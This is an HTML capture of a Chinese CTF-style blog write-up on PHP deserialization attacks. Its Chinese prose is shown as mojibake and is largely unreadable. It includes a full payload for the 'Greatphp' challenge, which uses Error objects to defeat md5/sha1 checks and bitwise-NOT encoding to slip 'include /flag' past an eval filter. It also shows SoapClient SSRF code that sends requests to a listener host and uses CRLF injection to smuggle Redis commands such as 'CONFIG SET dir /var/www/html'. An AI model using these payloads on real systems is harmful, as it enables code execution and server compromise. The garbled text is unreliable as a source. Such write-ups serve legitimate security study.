<li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> â€” è·å–è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li>
<li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²å½¢å¼çš„è°ƒç”¨æ ˆï¼ˆstack traceï¼‰</li>
<li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> â€” error çš„å­—ç¬¦ä¸²è¡¨è¾¾</li>
<li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> â€” å…‹éš† error</li>
</ul>
<h5 id="exception-ç±»"><a class="markdownIt-Anchor" href="#exception-ç±»"></a> Exception ç±»</h5>
<p>æ¡ä»¶ï¼šphp5</p>
<p>ç±»æ‘˜è¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* å±æ€§ */</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">	<span class="comment">/* æ–¹æ³• */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>ç±»å±æ€§ï¼š</strong></p>
<ul>
<li>messageï¼šå¼‚å¸¸æ¶ˆæ¯å†…å®¹</li>
<li>codeï¼šå¼‚å¸¸ä»£ç </li>
<li>fileï¼šæŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</li>
<li>lineï¼šæŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·</li>
</ul>
<p><strong>ç±»æ–¹æ³•ï¼š</strong></p>
<ul>
<li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> â€” å¼‚å¸¸æ„é€ å‡½æ•°</li>
<li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> â€” è·å–å¼‚å¸¸æ¶ˆæ¯å†…å®¹</li>
<li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> â€” è¿”å›å¼‚å¸¸é“¾ä¸­çš„å‰ä¸€ä¸ªå¼‚å¸¸</li>
<li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> â€” è·å–å¼‚å¸¸ä»£ç </li>
<li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> â€” åˆ›å»ºå¼‚å¸¸æ—¶çš„ç¨‹åºæ–‡ä»¶åç§°</li>
<li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> â€” è·å–åˆ›å»ºçš„å¼‚å¸¸æ‰€åœ¨æ–‡ä»¶ä¸­çš„è¡Œå·</li>
<li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> â€” è·å–å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li>
<li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> â€” è·å–å­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸è¿½è¸ªä¿¡æ¯</li>
<li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> â€” å°†å¼‚å¸¸å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²</li>
<li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> â€” å¼‚å¸¸å…‹éš†</li>
</ul>
<p>åœ¨Errorå’ŒExceptionè¿™ä¸¤ä¸ªPHPåŸç”Ÿç±»ä¸­å†…åªæœ‰ <code>__toString</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºå°†å¼‚å¸¸æˆ–é”™è¯¯å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>çœ‹çœ‹è§¦å‘Errorçš„__toStringæ–¹æ³•</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°è¿™å°†ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰æŠ¥é”™ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆâ€payloadâ€ï¼‰ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆâ€2â€ï¼‰ï¼Œè€Œä¼ å…¥ <code>Error(&quot;payload&quot;,1)</code> ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚</p>
<p>ä¸‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
<p>è¾“å‡º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
<p><code>$a</code> å’Œ <code>$b</code> è¿™ä¸¤ä¸ªé”™è¯¯å¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ <code>__toString</code> æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„</p>
<p>åˆ©ç”¨Errorå’ŒExceptionç±»çš„è¿™ä¸€ç‚¹å¯ä»¥ç»•è¿‡åœ¨PHPç±»ä¸­çš„å“ˆå¸Œæ¯”è¾ƒ</p>
<h5 id="2020-æå®¢å¤§æŒ‘æˆ˜greatphp"><a class="markdownIt-Anchor" href="#2020-æå®¢å¤§æŒ‘æˆ˜greatphp"></a> [2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp</h5>
<p>è¿˜æ˜¯ä¸€æ ·çš„ï¼Œç»™å‡ºæºç ï¼Œå°±ä»£ç å®¡è®¡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )</span><br></pre></td></tr></table></figure>
<p>å¯¹äºè¿™ä¸ªï¼Œæˆ‘ä»¬å¸¸è§çš„æ˜¯åˆ©ç”¨æ•°ç»„ç»•è¿‡å¼ºç±»å‹ï¼Œä½†æ˜¯è¿™ä¸ªæ˜¯åœ¨ç±»ä¸­ï¼Œä¸èƒ½ä½¿ç”¨æ•°ç»„ï¼Œåªæœ‰ä½¿ç”¨Errorç±»ã€‚</p>
<p>md5()å’Œsha1()å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ <code>__toString</code> æ–¹æ³•ï¼›ä¸”å½“eval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„ <code>__toString</code> æ–¹æ³•ï¼Œåˆšæ‰å®éªŒè¿‡ï¼ŒErrorç±»ä¸­çš„<code>__toString</code>å°†ç±»è½¬æ¢çš„å­—ç¬¦ä¸²ç›¸ç­‰ã€‚</p>
<p>åˆå­˜åœ¨preg_matchï¼Œè¿‡æ»¤äº†æ‹¬å·ï¼Œæ— æ³•è°ƒç”¨å‡½æ•°ï¼Œå°è¯•<code>include &quot;/flag&quot;</code>,ä½†æ˜¯å¼•å·è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>ä¸¤æ¬¡å–åï¼Œè‡ªåŠ¨è·å¾—å­—ç¬¦ä¸²</code>çš„ã€‚(ç»•è¿‡å¼•å·ï¼Œé•¿çŸ¥è¯†äº†)</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">		   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">		   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">			   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">		   &#125;</span><br><span class="line">		   </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$cmd</span>)</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">ä¹Ÿå¯ä»¥ç”¨ï¼Œä¹Ÿéœ€è¦ç”¨ä¸¤æ¬¡å–å</span></span><br><span class="line"><span class="comment">$str1 = &quot;?&gt;&lt;?=include[~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;][!&quot;.urldecode(&quot;%FF&quot;).&quot;]?&gt;&quot;;</span></span><br><span class="line"><span class="comment">$str = &quot;?&gt;&lt;?=include $_GET[1]?&gt;&quot;; </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™é“é¢˜æˆ‘æƒ³åˆ°èƒ½ä¸èƒ½åŒç”¨hexç¼–ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$cmd</span>=<span class="title function_ invoke__">hex2bin</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
<p>è™½ç„¶æœ€åä¹Ÿæ˜¯Stringå­—ç¬¦ï¼Œä½†æ˜¯æˆ‘å®éªŒä¸‹æ²¡æœ‰æˆåŠŸã€‚</p>
<p>æˆ‘ä¹Ÿæƒ³åˆ°ä¸€ä¸ªpayload,ç„¶å1æ¥ä¼ å‚ï¼Œä½†æ˜¯ä¹Ÿæ²¡æˆåŠŸ</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="string">&quot;?&gt;&quot;</span>&lt;<span class="string">?=</span><span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>];<span class="string">?&gt;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="soapclientç±»æ¥è¿›è¡Œssrf"><a class="markdownIt-Anchor" href="#soapclientç±»æ¥è¿›è¡Œssrf"></a> SoapClientç±»æ¥è¿›è¡ŒSSRF</h4>
<h5 id="soapclientç±»"><a class="markdownIt-Anchor" href="#soapclientç±»"></a> SoapClientç±»</h5>
<p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚</p>
<p>ç±»ä»‹ç»</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SoapClient &#123; </span><br><span class="line">	<span class="comment">/* æ–¹æ³• */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼Œå½“ <code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚è€Œ<code>__call</code>è§¦å‘å¾ˆç®€å•ï¼Œå°±æ˜¯å½“å¯¹è±¡è®¿é—®ä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™å°±ä¼šè§¦å‘ã€‚</p>
<p>è¯¥ç±»çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="keyword">public</span> SoapClient :: <span class="title function_ invoke__">SoapClient</span>(<span class="keyword">mixed</span> <span class="variable">$wsdl</span> [ï¼Œ<span class="keyword">array</span> <span class="variable">$options</span> ])</span><br><span class="line">- ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯wsdlæ¨¡å¼ï¼Œå°†è¯¥å€¼è®¾ä¸º<span class="literal">null</span>åˆ™è¡¨ç¤ºéwsdlæ¨¡å¼ã€‚</span><br><span class="line">- ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨wsdlæ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨éwsdlæ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½®locationå’Œurié€‰é¡¹ï¼Œå…¶ä¸­locationæ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„SOAPæœåŠ¡å™¨çš„URLï¼Œè€Œuri æ˜¯SOAPæœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥åˆ©ç”¨SoapClientæ¥è¿›è¡ŒSSRF</p>
<p>æ„é€ php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000/aaa&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://ip:10000&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è®°å¾—ç›‘å¬è‡ªå·±VPNä¸Šçš„ç«¯å£<br>
<img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWjNleU9uZA==,size_20,color_FFFFFF,t_70,g_se,x_16-16672739578745.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"></p>
<p>ä½†æ˜¯å½“å­˜åœ¨CRLFæ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>user_agent</code>çš„å‚æ•°ä¼ªé€ httpå¤´</p>
<p>è¿è¡Œåï¼Œç›‘å¬ç•Œé¢å°±å‡ºç°äº†ä¼ªé€ çš„httpå¤´</p>
<p><img src="/2022/11/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/f470fdddc476471d85f438538e078165-16672739578746.png" alt="è¯·æ·»åŠ å›¾ç‰‡æè¿°"><br>
è¿™å„¿å¯ä»¥çœ‹çœ‹æ€ä¹ˆåˆ©ç”¨ä¼ªé€ httpå¤´å»æ„é€ rediså‘½ä»¤</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://ip:10000/&#x27;</span>;</span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;CONFIG SET dir /var/www/html&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;hello^^&#x27;</span>.<span class="variable">$poc</span>.<span class="string">&#x27;^^hello&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\n\r&quot;</span>,<span class="variable">$b</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// éšä¾¿è°ƒç”¨å¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•, è§¦å‘__callæ–¹æ³•è¿›è¡Œssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
